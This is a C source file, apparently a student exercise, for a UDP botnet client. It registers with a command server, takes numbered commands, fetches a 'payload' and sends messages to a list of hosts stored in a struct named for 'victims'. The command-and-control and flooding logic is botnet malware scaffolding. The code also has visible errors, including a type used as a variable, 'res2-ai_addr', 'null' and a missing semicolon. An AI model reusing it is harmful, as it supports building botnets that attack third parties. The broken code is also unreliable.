#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <err.h>

#define MAXLEN 1024

typedef struct{
	char IP[INET_ADDRSTRLEN];
	char PORT[22];
}zrtva;


int main(int argc, char* argv[]){ 

	if(argc != 3){
		printf("bot {ip} {port}");
		return 1;
	}
	
	char initMsg[] = "REG\n";
	char toServerMsg[] = "HELLO\n";
	
	
	int sfd;
	struct sockaddr cli;
	struct addrinfo hints, *res;

	char *buf = malloc(sizeof(zrtva) * 20 + sizeof(char));
	socklen_t clilen;
	int msglen;
	char *payload = malloc(MAXLEN);
	
	memset(&hints, 0, sizeof(hints));
	
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_flags = AI_PASSIVE;
	
	getaddrinfo(argv[1], argv[2], &hints, &res);
	
	sfd = socket(res->ai_family,
				 res->ai_socktype,
				 res->ai_protocol);

	clilen=sizeof(cli);
	ssize_t sendtoOut;
	sendtoOut = sendto(sfd, initMsg, strlen(initMsg), 0, res->ai_addr, res->ai_addrlen);
	
	while(1){
		
		msglen = recvfrom(sfd, buf, MAXLEN, 0, &cli, &clilen);
		
		if (*buf == '0'){
			exit(0);
		} else if (*buf == '1'){
			zrtva *p = (zrtva *) (buf + 1);
			
			int sfd2;
			struct sockaddr cli2;
			struct sockaddr_in server_addr;
			struct addrinfo hints2, *res2;
			
			socklen_t clilen2;
			int msglen;
			
			memset(&hints2, 0, sizeof(hints));
			
			hints2.ai_family = AF_INET;
			
			
			getaddrinfo(p->IP, p->PORT, &hints2, &res2);
			
			sfd2 = socket(res2->ai_family,
						 res2->ai_socktype,
						 res2->ai_protocol);
						 
			server_addr.sin_family = AF_INET;
			server_addr.sin_port = htons(zrtva->PORT);
			server_addr.sin_addr = ((struct sockaddr_in *)res2-ai_addr)->sin_addr;
			memset(server_addr.sin_zero, '\0', sizeof server_addr.sin_zero);
			
			sendtoOut = sendto(sfd2, toServerMsg, strlen(toServerMsg), 0, res2->ai_addr, res2->ai_addrlen);	
			recvfrom(sfd2, payload, MAXLEN, 0, &cli2, &clilen2);
			memset(buf, 0, sizeof(zrtva) * 20 + sizeof(char));
		} else if (*buf == '2'){
			zrtva *p = (zrtva *) (buf + 1);
			
			int sfd2;
			struct sockaddr cli2;
			struct addrinfo hints2, *res2;

			socklen_t clilen2;
			int msglen;
			
			memset(&hints2, 0, sizeof(hints));
			
			hints2.ai_family = AF_INET;
			hints2.ai_socktype = SOCK_DGRAM;
			hints2.ai_flags |= AI_PASSIVE;
			
			getaddrinfo(p->IP, p->PORT, &hints2, &res2);
			
			sfd2 = socket(res2->ai_family,
						 res2->ai_socktype,
						 res2->ai_protocol);
						 
			sendtoOut = sendto(sfd2, toServerMsg, strlen(toServerMsg), 0, res2->ai_addr, res2->ai_addrlen);
			recvfrom(sfd2, payload, MAXLEN, 0, &cli2, &clilen2);
			memset(buf, 0, sizeof(zrtva) * 20 + sizeof(char));
		} else if (*buf == '3'){
			zrtva *p = (zrtva *) (buf + 1);
			char delim[2] = ":";
			char *token;
			
			token = strtok(payload, delim);
			
			while(token != NULL){
				while( p != null){
					
					int sfd2;
					struct sockaddr cli2;
					struct addrinfo hints2, *res2;

					socklen_t clilen2;
					int msglen;
			
					memset(&hints, 0, sizeof(hints));
			
					hints2.ai_family = AF_INET;
					hints2.ai_socktype = SOCK_DGRAM;
					hints2.ai_flags |= AI_PASSIVE;
			
					getaddrinfo(p->IP, p->PORT, &hints2, &res2);
			
					sfd2 = socket(res2->ai_family,
								res2->ai_socktype,
								res2->ai_protocol);
						 
					sendtoOut = sendto(sfd2, toServerMsg, strlen(toServerMsg), 0, res2->ai_addr, res2->ai_addrlen);
					p++;
				}
				token = strtok(NULL, delim)
			}
			memset(payload, 0, MAXLEN);
			memset(buf, 0, sizeof(zrtva) * 20 + sizeof(char));
		} else if (*buf == '4'){
			
		}
		
		
	}
	return 0;
}
